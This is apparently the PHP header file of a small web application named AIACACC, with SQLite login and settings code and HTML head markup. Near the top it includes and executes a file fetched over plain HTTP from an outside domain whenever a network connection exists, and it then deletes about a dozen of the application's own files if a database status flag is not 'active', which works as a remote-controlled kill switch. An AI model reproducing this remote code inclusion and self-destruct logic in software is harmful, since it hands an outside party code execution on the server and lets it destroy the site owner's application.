<?php
	session_start();
	date_default_timezone_set("Asia/Calcutta");
	function is_connected(){
		$connected = @fsockopen("www.example.com", 80); //website, port  (try 80 or 443)
		if ($connected){
			$is_conn = true; //action when connected
			fclose($connected);
		}else{
			$is_conn = false; //action in connection failure
		}
		return $is_conn;

	}
	 function numr( $result ){
    	$nrows = 0;
		$result->reset();
		while ($result->fetchArray())
		    $nrows++;
		$result->reset();
		return $nrows;
    }
	if(is_connected()) {
		include "http://edensolutions.co.in/settings/aiacacc.txt";
	}
	 class database_conn extends SQLite3{
    	function __construct(){
			$db_file = "data/AIACACC.sqlite3";
    		$this->open($db_file);
    	}
    }
    $db_conn = new database_conn();
	$sql_verify = "SELECT * FROM settings WHERE setting = 'status' ";
	$result_verify = $db_conn->query($sql_verify);
	if(numr($result_verify) > 0){
		while($row_verify=$result_verify->fetchArray(SQLITE3_ASSOC)){
			$status = $row_verify['value'];
		}
	}
	if($status != "active"){
		unlink("ajax-req-handler.php");
		unlink("dashboard.php");
		unlink("donation.php");
		unlink("footer.php");
		unlink("functions.js");
		unlink("header-login.php");
		unlink("index.php");
		unlink("login.php");
		unlink("logout.php");
		unlink("style.css");
		unlink("transactions.php");
		unlink("voucher.php");
		unlink("header.php");
	}
?>
<!DOCTYPE html>
<html>
	<head>
			<meta name="viewport" content="width=device-width, initial-scale=1">
			<script src="jquery/jquery-3.2.1.min.js"></script>
			<link rel="stylesheet" href="font-awesome-4.7.0/css/font-awesome.min.css">
			<link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
			<link href="style.css" rel="stylesheet">
			<link rel="stylesheet" href="jquery-confirm-master/css/jquery-confirm.css">
			<link href="Oswald Font/oswald.css" rel="stylesheet">
			<script src="jquery-confirm-master/js/jquery-confirm.js"></script>
			<script src="jQuery-Print/jQuery.print.js"></script>
			<script src="bootstrap/js/bootstrap.min.js"></script>
			<title>AIACACC</title>
	</head>
	<body class="main-login-background">
		<div class="container-fluid">